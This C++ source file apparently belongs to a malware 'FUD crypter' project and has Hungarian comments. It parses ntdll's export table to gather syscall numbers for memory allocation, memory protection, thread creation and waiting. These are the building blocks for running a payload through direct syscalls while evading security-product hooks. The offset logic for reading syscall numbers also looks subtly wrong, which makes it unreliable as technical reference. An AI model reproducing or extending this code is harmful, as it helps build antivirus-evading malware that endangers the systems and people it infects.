#include "fud_crypter/syscall.hpp"
#include <winternl.h>
#include <vector>
#include <string>    // <-- HIÁNYZOTT
#include <cstdint>   // <-- HIÁNYZOTT

namespace fud_crypter {
namespace syscall {

uint32_t NtAllocateVirtualMemory_SSN = 0;
uint32_t NtProtectVirtualMemory_SSN = 0;
uint32_t NtCreateThreadEx_SSN = 0;
uint32_t NtWaitForSingleObject_SSN = 0;

void load_syscall_numbers() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return;

    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(ntdll);
    auto nt = reinterpret_cast<IMAGE_NT_HEADERS*>(
        reinterpret_cast<uint8_t*>(ntdll) + dos->e_lfanew
    );
    auto exp = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    auto exports = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
        reinterpret_cast<uint8_t*>(ntdll) + exp->VirtualAddress
    );

    auto names = reinterpret_cast<uint32_t*>(
        reinterpret_cast<uint8_t*>(ntdll) + exports->AddressOfNames
    );
    auto functions = reinterpret_cast<uint32_t*>(
        reinterpret_cast<uint8_t*>(ntdll) + exports->AddressOfFunctions
    );
    auto ordinals = reinterpret_cast<uint16_t*>(
        reinterpret_cast<uint8_t*>(ntdll) + exports->AddressOfNameOrdinals
    );

    for (uint32_t i = 0; i < exports->NumberOfNames; ++i) {
        const char* name = reinterpret_cast<const char*>(
            reinterpret_cast<uint8_t*>(ntdll) + names[i]
        );
        uintptr_t addr = reinterpret_cast<uintptr_t>(ntdll) + functions[ordinals[i]];
        uint32_t ssn = 0;

        // Az SSN a függvény 4. bájtja (mov eax, SSN)
        ssn = *reinterpret_cast<uint8_t*>(addr + 4);

        if (std::string(name) == "NtAllocateVirtualMemory") {
            NtAllocateVirtualMemory_SSN = ssn;
        } else if (std::string(name) == "NtProtectVirtualMemory") {
            NtProtectVirtualMemory_SSN = ssn;
        } else if (std::string(name) == "NtCreateThreadEx") {
            NtCreateThreadEx_SSN = ssn;
        } else if (std::string(name) == "NtWaitForSingleObject") {
            NtWaitForSingleObject_SSN = ssn;
        }
    }
}

} // namespace syscall
} // namespace fud_crypter
